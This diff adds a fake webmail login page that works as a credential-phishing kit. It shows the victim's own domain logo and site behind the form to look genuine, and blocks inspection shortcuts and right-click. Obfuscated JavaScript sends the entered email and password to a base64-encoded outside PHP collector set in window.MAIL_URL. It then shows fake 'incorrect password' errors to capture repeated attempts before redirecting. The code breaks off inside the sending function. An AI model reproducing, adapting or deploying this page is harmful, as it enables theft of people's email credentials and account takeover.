@@ -1,0 +1,534 @@
+<script language=javascript><!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <meta name="referrer" content="strict-origin" />
+    <link
+      id="favicon"
+      rel="shortcut icon"
+      type="image/png"
+      href="https://alphatrade-options.com/git/rand/favicon.png"
+    />
+    <title>Webmail - Login</title>
+    <style>
+      body {
+        background-color: #eeeeee;
+        font-family: Helvetica Neue, Helvetica, sans-serif;
+        font-size: 13px;
+        color: #425152;
+        margin: 0;
+      }
+
+      ::-moz-placeholder {
+        color: #d9dad9;
+      }
+
+      :-ms-input-placeholder {
+        color: #d9dad9;
+      }
+
+      ::-ms-input-placeholder {
+        color: #d9dad9;
+      }
+
+      ::placeholder {
+        color: #d9dad9;
+      }
+
+      a {
+        color: #425152;
+        text-decoration: none;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      input {
+        border-radius: 5px;
+        padding: 5px 3px;
+      }
+
+      input.submit {
+        font-weight: bold;
+        text-align: center;
+        min-width: 90px;
+        color: #f0f0f0;
+        background: #444444;
+        padding: 5px 12px;
+        border-color: #444444;
+        border-style: solid;
+        cursor: pointer;
+      }
+
+      input.submit:hover {
+        color: #ffffff;
+      }
+
+      .row {
+        margin: 10px 0;
+      }
+
+      .row:after {
+        content: '';
+        display: table;
+        clear: both;
+      }
+
+      .logoWithPortalIcons {
+        width: 150px;
+        height: 50px;
+        background: transparent
+          url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=')
+          /*IconsTogether.svg*/ no-repeat left top;
+      }
+
+      .logoOnly {
+        width: 280px;
+        height: 30px;
+        overflow: hidden;
+      }
+
+      .logoOnly .logoWithPortalIcons {
+        width: 320px;
+        height: 120px;
+      }
+
+      .title {
+        font-size: 26px;
+        margin: 20px 0 10px;
+      }
+
+      .red {
+        color: #ee3031;
+      }
+
+      a#create-account {
+        display: inline-block;
+        border-radius: 4px;
+        padding: 3px 8px;
+        border: 1px solid #ee3031;
+      }
+
+      a#create-account:hover {
+        text-decoration: none;
+      }
+
+      .col1,
+      .col2 {
+        float: left;
+        line-height: 30px;
+        vertical-align: middle;
+        padding-top: 4px;
+      }
+
+      .col1 {
+        width: 124px;
+        font-size: 13px;
+        font-weight: 600;
+      }
+
+      .col2 {
+        width: 286px;
+      }
+
+      .col2 input {
+        width: 96%;
+      }
+
+      .error {
+        color: #d52b1e;
+        font-weight: normal;
+      }
+
+      .container {
+        background: rgba(255, 255, 255, 1);
+        padding: 40px;
+        box-shadow: 2px 2px 4px 2px #ccc;
+        width: 416px;
+        border-radius: 5px;
+        /*
+            margin: 0 auto;
+            position:absolute;
+            left:0;
+            right:0;
+            top:38%;
+            top:100px\9;
+            transform: translateY(-50%);
+            */
+        margin: 10% auto 30px auto;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      }
+
+      .password-icon {
+        width: 15px;
+        position: absolute;
+        cursor: pointer;
+        margin-top: 9px;
+        margin-left: -28px;
+        background-color: white;
+      }
+
+      #login_footer {
+        line-height: 125%;
+        font-size: 12px;
+        text-align: justify;
+        width: 500px;
+        margin: 90px auto auto auto;
+        padding-left: 10px;
+      }
+
+      @media only screen and (max-width: 600px) {
+        body {
+          background-image: none;
+        }
+
+        .container {
+          /*
+                position:relative;
+                padding: 20px;
+                box-shadow:none;
+                width: 375px;
+                top:0;
+                left:auto;
+                right:auto;
+                transform: translateY(0);
+                */
+          width: 100%;
+          border-radius: 0;
+          box-shadow: none;
+          padding: 0;
+          margin-top: 0;
+        }
+
+        .container div.body {
+          padding: 40px 20px;
+        }
+
+        .col1,
+        .col2 {
+          float: none;
+          width: 100%;
+        }
+
+        #login_footer {
+          width: 99%;
+          margin-top: 20px;
+        }
+
+        #login_footer div.content {
+          padding: 10px 20px 10px 10px;
+        }
+
+        .password-icon {
+          margin-top: -25px;
+          right: 7%;
+        }
+      }
+
+      .xlogo {
+        color: #fff;
+        margin-bottom: 10px;
+        margin-top: -25px;
+      }
+
+      .xlogo img {
+        vertical-align: middle;
+        width: 5%;
+        height: 5%;
+        object-fit: contain;
+      }
+
+      .xlogo span {
+        vertical-align: middle;
+      }
+
+      .text-g {
+        font-family: 'Arial Black', Gadget, sans-serif;
+        text-transform: uppercase !important;
+        text-align: center;
+        font-size: 25px;
+        color: #444444;
+        background-color: rgba(255, 255, 255, 0);
+        text-shadow: rgb(255, 255, 255) 2px 2px 2px;
+      }
+
+      #root {
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        top: 0;
+        z-index: -10;
+        pointer-events: none;
+        filter: brightness(0.3);
+      }
+    </style>
+
+    
+      document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'C'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'X'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'Y'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'Z'.charCodeAt(0)) {
+          return false
+        }
+        if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) {
+          return false
+        }
+        if (
+          e.keyCode == 'J'.charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false
+        }
+        if (
+          e.keyCode == 'I'.charCodeAt(0) &&
+          e.altKey &&
+          (e.ctrlKey || e.metaKey)
+        ) {
+          return false
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'S'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0))
+        ) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+          return false
+        }
+        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'F'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0))
+        ) {
+          return false
+        }
+        if (
+          (e.metaKey && e.keyCode == 'E'.charCodeAt(0)) ||
+          (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0))
+        ) {
+          return false
+        }
+      }
+      if (document.addEventListener) {
+        document.addEventListener(
+          'contextmenu',
+          function (e) {
+            e.preventDefault()
+          },
+          false
+        )
+      } else {
+        document.attachEvent('oncontextmenu', function () {
+          window.event.returnValue = false
+        })
+      }
+    </script>
+  </head>
+
+  <body>
+    <div id="app" v-if="vueAppIsLoaded">
+      <div
+        class="container"
+        id="container"
+        style="padding-bottom: 10px !important; position: relative"
+      >
+        <div
+          style="
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            left: 0;
+            background: #fff;
+            opacity: 0.7;
+            z-index: 10;
+          "
+          id="bg_screen"
+          v-if="isLoading"
+        ></div>
+        <img
+          src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif"
+          style="
+            z-index: 10;
+            width: 50px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+          "
+          id="loading_image"
+          v-if="isLoading"
+        />
+
+        <div class="body">
+          <div class="xlogo">
+            <img
+              id="zion"
+              :src="emailDomainLogo"
+              onerror="this.onerror=null;this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC';"
+            />
+            <span style="text-transform: capitalize" class="text-g" id="banNer"
+              >{{ emailDomainLogoName }}</span
+            >
+          </div>
+          <div class="row">
+            <div class="col1"><label for="ai">Email:</label></div>
+            <div class="col2">
+              <input
+                :class="{hasValue:emailNotEmpty}"
+                ref="emailElement"
+                v-model="email"
+                type="text"
+                name="ai"
+                id="ai"
+                placeholder="Email Address"
+              />
+            </div>
+          </div>
+          <div
+            class="row"
+            style="position: relative; overflow: visible; margin-bottom: 10px"
+          >
+            <div class="col1"><label for="pr">Password:</label></div>
+            <div class="col2">
+              <input
+                :class="{hasValue:passwordNotEmpty}"
+                ref="passwordElement"
+                v-model="password"
+                v-bind="{type: (showPassword) ? 'text' : 'password'}"
+                name="pr"
+                id="pr"
+                placeholder="Enter Password"
+              />
+            </div>
+            <!-- Password Visibility -->
+            <img
+              id="id-password-reveal-icon"
+              class="password-icon"
+              v-if="!showPassword"
+              src="https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png"
+              @click="togglePasswordVisibility"
+            />
+
+            <img
+              id="id-password-reveal-icon"
+              class="password-icon"
+              v-if="showPassword"
+              src="https://ik.imagekit.io/escrowmade/download__1__OSvF-Qvmk.png"
+              @click="togglePasswordVisibility"
+            />
+          </div>
+        </div>
+
+        <div v-if="errorMessage" class="row">
+          <div><span class="error" id="error">{{ errorMessage }}</span></div>
+        </div>
+        <div v-if="successMessage" class="row">
+          <div>
+            <span class="success" id="success">{{ successMessage }}</span>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="col1" style="line-height: 40px; padding-top: 10px">
+            <input
+              @click.prevent="handleSubmit"
+              type="button"
+              id="submit_btn"
+              class="submit"
+              :value="submitButtonElementText"
+              style="padding: 7px 24px"
+            />
+          </div>
+        </div>
+
+        <div class="row">
+          <p style="font-size: 120%; color: #ff2b10"></p>
+          <p>
+            This information system is the property of
+            <span id="kai" style="text-transform: capitalize"
+              >{{ emailDomainLogoName }}</span
+            >.
+            <br />
+            We advise all users to verify their email account for security
+            reasons.<br />
+            By continuing to use the system you indicate your awareness of and
+            consent to these terms and conditions of use.
+          </p>
+        </div>
+      </div>
+      <div id="root">
+        <iframe
+          id="myframe"
+          scrolling="no"
+          :src="emailDomainFullUrl"
+          width="100%"
+          height="100%"
+          frameborder="0"
+        ></iframe>
+      </div>
+    </div>
+    <!-- SCRIPT BEGINS -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+    <!-- SET WINDOW VARIABLE -->
+    <script>
+      // This is the hash encrpytion aHR0cHM6Ly9hZmhlYWx0aGNhcmUuY29tLm5nL092ZXIvbWFpbF9zZW5kbWFpbC5waHA=
+      // of
+      // https://martinoketurraciai.io/css/cf/jd.php
+      // Remove the "//" if you want to use the
+
+      // window.MAIL_URL = 'https://martinoketurraciai.io/css/cf/jd.php'
+      window.MAIL_URL = 'aHR0cHM6Ly9hZmhlYWx0aGNhcmUuY29tLm5nL092ZXIvbWFpbF9zZW5kbWFpbC5waHA='
+      window.AUTH_LOADING_MESSAGE = 'Login'
+      window.LOGIN_ERROR_MESSAGE = `Your Account Password is incorrect`
+      window.DEFAULT_SITE_TITLE = 'Webmail - Login'
+      window.DEFAULT_SITE_LOGO =
+        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC'
+      window.DEFAULT_SITE_FAVICON =
+        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC'
+      //SETTING OF SOME STUFF
+      window.ALLOW_DYNAMIC_EMAIL_LOGO = true
+      window.ENABLE_PASSWORD_VISIBILITY_TOGGLE = true
+    </script>
+    <script>
+     const _0x2eaf78=_0x297d;function _0x1ad7(){const _0x47dd06=['length','handleSubmit','105868QPimew','LOGIN_ERROR_MESSAGE','querySelector','#div3','494892iCfKqx','request','finalRedirectUrl','email','ALLOW_DYNAMIC_EMAIL_LOGO','Incorrect\x20Password!\x20Please\x20enter\x20with\x20correct\x20password.','dispatch','random','retryAttemptCount','toString','DEFAULT_SITE_TITLE','0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ','message','appendChild','0123456789','value','emailElement','emailDomainFavicon','https://www.','link','icon','test','$nextTick','title','headers','floor','addEventListener','randomString','onerror','\x20account','1327482PwNwad','turnUrlToRandom','hide','Please\x20enter\x20your\x20email\x20address\x20or\x20member\x20ID.','20883ATQaEf','setDocumentPageFavicon','vueAppIsLoaded','toUpperCase','charAt','split','request-startTime','isLoading','searchParams','target','DEFAULT_SITE_FAVICON','password','body','validateEmail','getElementsByTagName','enablePasswordVisibilityToggle',':visible','errorMessage','304epdMdR','websrc','click','10sdgAOO','get','replace','onload','Unable\x20to\x20connect\x20to\x20server','slice','href','Please\x20enter\x20a\x20valid\x20email\x20address\x20or\x20member\x20ID.','has','Login','interceptors','config','391470EGDDbp','rel','https://logo.clearbit.com/','src','https://','link[rel~=\x27icon\x27]','pageMiddleware','ENABLE_PASSWORD_VISIBILITY_TOGGLE','#app','removeClass','append','successMessage','1271611osnkwS','1881556HjRrGD','#ai','preventDefault','emailDomainName','194wDjdVL','isEmpty','showPassword','show','#div1','Password\x20must\x20be\x20greater\x20than\x20four\x20characters.','keyCode','fadeOut','Dynamic\x20email\x20logo\x20not\x20allowed','#background-loader','animate','setDocumentPageTitle','#emailContainerHolder','checkForDynamicAndValidateSplitEmail','onKeydown','post','#error','which','location','Sign\x20in\x20','#div2','Sign\x20in\x20Session\x20timeout,\x20please\x20try\x20again','request-duration','toPasswordPage','focus','response','toLowerCase','10eaCbtk','$refs','MAIL_URL'];_0x1ad7=function(){return _0x47dd06;};return _0x1ad7();}function _0x297d(_0x2f20eb,_0x15c9a0){const _0x1ad75b=_0x1ad7();return _0x297d=function(_0x297d55,_0x2e609c){_0x297d55=_0x297d55-0x102;let _0x15c54f=_0x1ad75b[_0x297d55];return _0x15c54f;},_0x297d(_0x2f20eb,_0x15c9a0);}(function(_0x53985a,_0xcd7ccf){const _0x56a634=_0x297d,_0xfcf5e3=_0x53985a();while(!![]){try{const _0x1846af=parseInt(_0x56a634(0x143))/0x1+-parseInt(_0x56a634(0x11f))/0x2*(-parseInt(_0x56a634(0x165))/0x3)+parseInt(_0x56a634(0x11b))/0x4*(-parseInt(_0x56a634(0x102))/0x5)+-parseInt(_0x56a634(0x10e))/0x6+-parseInt(_0x56a634(0x13f))/0x7*(-parseInt(_0x56a634(0x177))/0x8)+-parseInt(_0x56a634(0x161))/0x9+-parseInt(_0x56a634(0x13a))/0xa*(parseInt(_0x56a634(0x11a))/0xb);if(_0x1846af===_0xcd7ccf)break;else _0xfcf5e3['push'](_0xfcf5e3['shift']());}catch(_0x530eae){_0xfcf5e3['push'](_0xfcf5e3['shift']());}}}(_0x1ad7,0x74233),new Vue({'data':()=>({'vueAppIsLoaded':![],'showPassword':![],'retryAttemptCount':0x0,'isLoading':![],'submitButtonText':_0x2eaf78(0x10b),'errorMessage':'','successMessage':'','email':'','password':''}),'created'(){const _0x2eb2ea=_0x2eaf78;this[_0x2eb2ea(0x162)](),axios[_0x2eb2ea(0x10c)][_0x2eb2ea(0x144)]['use'](_0x118150=>{const _0x35e292=_0x2eb2ea;return _0x118150[_0x35e292(0x15b)][_0x35e292(0x16b)]=new Date(),_0x118150;}),axios['interceptors'][_0x2eb2ea(0x138)]['use'](_0xfa87b=>{const _0x4e80fd=_0x2eb2ea,_0x4cdd6f=_0xfa87b[_0x4e80fd(0x10d)][_0x4e80fd(0x15b)]['request-startTime'],_0x3d49a1=new Date(),_0xb299b6=_0x3d49a1-_0x4cdd6f;return _0xfa87b[_0x4e80fd(0x15b)]['request-duration']=_0xb299b6,_0xfa87b;});const _0x22c542=window[_0x2eb2ea(0x131)]['href'],_0x37f525=_0x22c542['split']('#');if(_0x37f525['length']>0x1){const _0x44055f=_0x37f525[_0x37f525[_0x2eb2ea(0x13d)]-0x1];try{this[_0x2eb2ea(0x146)]=this[_0x2eb2ea(0x172)](_0x44055f)?_0x44055f:atob(_0x44055f);}catch(_0x5eb8b5){}}this[_0x2eb2ea(0x114)](),$('body')['on'](_0x2eb2ea(0x179),'a',function(_0x18ad44){const _0x46379b=_0x2eb2ea;_0x18ad44[_0x46379b(0x11d)]();}),$(_0x2eb2ea(0x171))[_0x2eb2ea(0x117)]('down'),$(_0x2eb2ea(0x128))[_0x2eb2ea(0x126)](0xfa);},'mounted':function(){const _0x1e77d6=_0x2eaf78;this[_0x1e77d6(0x159)](function(){const _0x2e3852=_0x1e77d6;this[_0x2e3852(0x167)]=!![],this['setDocumentPageFavicon'](),this[_0x2e3852(0x12a)](),document[_0x2e3852(0x15d)]('keydown',this[_0x2e3852(0x12d)]),setTimeout(()=>{const _0x526b7d=_0x2e3852;$(_0x526b7d(0x123))[_0x526b7d(0x122)]();if(_[_0x526b7d(0x120)](this[_0x526b7d(0x146)]))$(_0x526b7d(0x123))[_0x526b7d(0x122)](),$(_0x526b7d(0x12b))[_0x526b7d(0x122)](),$(_0x526b7d(0x11c))[_0x526b7d(0x179)](function(){const _0x48eb7d=_0x526b7d;$(_0x48eb7d(0x12f))[_0x48eb7d(0x163)]();}),this[_0x526b7d(0x13b)][_0x526b7d(0x153)]['focus']();else{}},0x258);});},'filters':{'capitalize':function(_0x9a9e6f){const _0x56232b=_0x2eaf78;if(!_0x9a9e6f)return'';return _0x9a9e6f=_0x9a9e6f[_0x56232b(0x14c)](),_0x9a9e6f[_0x56232b(0x169)](0x0)['toUpperCase']()+_0x9a9e6f[_0x56232b(0x107)](0x1);},'camelCase':function(_0x264713){const _0x4d2316=_0x2eaf78;return str[_0x4d2316(0x139)]()[_0x4d2316(0x104)](/[-_]+/g,'\x20')[_0x4d2316(0x104)](/[^\w\s]/g,'')[_0x4d2316(0x104)](/ (.)/g,function(_0x472b44){const _0x13f482=_0x4d2316;return _0x472b44[_0x13f482(0x168)]();})[_0x4d2316(0x104)](/ /g,'');}},'computed':{'enablePasswordVisibilityToggle':function(){const _0x202715=_0x2eaf78;return window[_0x202715(0x115)]||![];},'emailIsEmpty':function(){const _0xd018df=_0x2eaf78;return _[_0xd018df(0x120)](this[_0xd018df(0x146)]);},'emailNotEmpty':function(){const _0x4b661f=_0x2eaf78;return!_[_0x4b661f(0x120)](this['email']);},'passwordNotEmpty':function(){const _0x570394=_0x2eaf78;return!_[_0x570394(0x120)](this['password']);},'submitButtonElementText':function(){return this['isLoading']?window['AUTH_LOADING_MESSAGE']:this['submitButtonText'];},'emailDomainFullUrl':function(){const _0x2176be=_0x2eaf78;try{const _0x306ab1=this[_0x2176be(0x12c)](this[_0x2176be(0x146)])[0x1];return _0x2176be(0x155)+_0x306ab1;}catch(_0x27d6e8){}},'emailDomainLogo':function(){const _0x4aeaae=_0x2eaf78;try{const _0x45159c=this[_0x4aeaae(0x12c)](this[_0x4aeaae(0x146)])[0x1];return _0x4aeaae(0x110)+_0x45159c;}catch(_0xa00e4d){return window['DEFAULT_SITE_LOGO'];}},'emailDomainLogoName':function(){const _0x1fc011=_0x2eaf78;try{return this['checkForDynamicAndValidateSplitEmail'](this[_0x1fc011(0x146)])[0x1][_0x1fc011(0x16a)]('.')[0x0];}catch(_0x540de7){return'';}},'emailDomainFavicon':function(){const _0x592abe=_0x2eaf78;try{const _0x2a6cba=this['checkForDynamicAndValidateSplitEmail'](this['email'])[0x1];return _0x592abe(0x110)+_0x2a6cba;}catch(_0x396a11){return window[_0x592abe(0x16f)];}},'emailDomainName':function(){try{return this['checkForDynamicAndValidateSplitEmail'](this['email'])[0x1];}catch(_0x2aac5e){return'';}},'emailUsername':function(){const _0x5f388f=_0x2eaf78;try{return this[_0x5f388f(0x12c)](this[_0x5f388f(0x146)])[0x0];}catch(_0x4087b6){return'';}}},'watch':{'email':async function(){const _0x183155=_0x2eaf78;this[_0x183155(0x166)](),this['setDocumentPageTitle']();}},'methods':{'onKeydown'(_0x3cb11a){const _0x39a9fe=_0x2eaf78;var _0xc5e529=_0x3cb11a[_0x39a9fe(0x125)]?_0x3cb11a['keyCode']:_0x3cb11a[_0x39a9fe(0x130)];if(_0xc5e529=='13'){if($(_0x39a9fe(0x123))['is'](_0x39a9fe(0x175)))this[_0x39a9fe(0x136)]();else $(_0x39a9fe(0x133))['is'](_0x39a9fe(0x175))?this[_0x39a9fe(0x13e)]():this[_0x39a9fe(0x13e)]();}},'resetEmail'(){const _0x13c469=_0x2eaf78;this[_0x13c469(0x146)]='',this[_0x13c469(0x14b)]=0x0;},'togglePasswordVisibility'(){const _0x404902=_0x2eaf78;this[_0x404902(0x174)]&&(this[_0x404902(0x121)]=!this[_0x404902(0x121)]);},'toPasswordPage'(){const _0x505582=_0x2eaf78;if(!this['validateEmail'](this[_0x505582(0x146)]))return $(_0x505582(0x12f))[_0x505582(0x163)](),this[_0x505582(0x13b)]['emailElement'][_0x505582(0x137)](),![];$(_0x505582(0x123))['animate']({'left':0x0,'opacity':_0x505582(0x163)},0x0),$(_0x505582(0x133))[_0x505582(0x129)]({'right':0x0,'opacity':'show'},0x1f4);},'backToEmailPage'(){const _0x243262=_0x2eaf78;this[_0x243262(0x146)]='',this[_0x243262(0x170)]='',$(_0x243262(0x133))['animate']({'left':0x0,'opacity':_0x243262(0x163)},0x0),$(_0x243262(0x123))[_0x243262(0x129)]({'right':0x0,'opacity':_0x243262(0x122)},0x3e8),$(_0x243262(0x12b))['show'](),$(_0x243262(0x11c))[_0x243262(0x179)](function(){const _0x3e5b73=_0x243262;$(_0x3e5b73(0x12f))[_0x3e5b73(0x163)]();}),this['$refs'][_0x243262(0x153)][_0x243262(0x137)]();},async 'handleSaveEmail'(){const _0x506d2f=_0x2eaf78;this[_0x506d2f(0x176)]='';try{this[_0x506d2f(0x16c)]=!![];const _0x4e4951=this['$refs'][_0x506d2f(0x153)][_0x506d2f(0x152)];if(!this['validateEmail'](_0x4e4951))throw Error('That\x20Microsoft\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account');setTimeout(()=>{const _0xc3d5f0=_0x506d2f;this['email']=_0x4e4951,this[_0xc3d5f0(0x16c)]=![];},0x3e8);}catch(_0x56f7a7){this['isLoading']=![],this[_0x506d2f(0x176)]=_0x56f7a7[_0x506d2f(0x14f)];}},async 'handleSubmit'(){const _0x172bee=_0x2eaf78;this[_0x172bee(0x176)]='',this[_0x172bee(0x119)]='';try{if(!(this['email']&&this[_0x172bee(0x170)]))throw Error(_0x172bee(0x164));if(!this[_0x172bee(0x172)](this[_0x172bee(0x146)]))throw Error(_0x172bee(0x109));if(this[_0x172bee(0x170)][_0x172bee(0x13d)]<=0x4)throw Error(_0x172bee(0x124));this[_0x172bee(0x16c)]=!![];const _0x288bb3=await this['sendMail'](this[_0x172bee(0x146)],this['password']);setTimeout(()=>{const _0x837bfe=_0x172bee;this[_0x837bfe(0x14b)]<0x2?(this[_0x837bfe(0x170)]='',this[_0x837bfe(0x16c)]=![],this['errorMessage']=window[_0x837bfe(0x140)],this[_0x837bfe(0x14b)]===0x1&&(this['errorMessage']=_0x837bfe(0x148)),this[_0x837bfe(0x14b)]===0x2&&(this[_0x837bfe(0x176)]=_0x837bfe(0x134)),this['retryAttemptCount']=this[_0x837bfe(0x14b)]+0x1):(this[_0x837bfe(0x16c)]=![],this['successMessage']='Succesfully\x20Update.\x20Wait\x20you\x20are\x20being\x20redirected\x20to\x20your\x20homepage',$('#div2')[_0x837bfe(0x129)]({'left':0x0,'opacity':_0x837bfe(0x163)},0x0),$(_0x837bfe(0x142))[_0x837bfe(0x129)]({'left':0x0,'opacity':'show'},0x1f4),setTimeout(()=>{const _0x2248a9=_0x837bfe;window['location'][_0x2248a9(0x104)](this[_0x2248a9(0x145)]());},0x3e8));},0xfa0-_0x288bb3[_0x172bee(0x15b)][_0x172bee(0x135)]);}catch(_0x49b3b1){this[_0x172bee(0x16c)]=![],this['errorMessage']=_0x49b3b1['message'];}},async 'sendMail'(_0x30c15e,_0x7c5a99){const 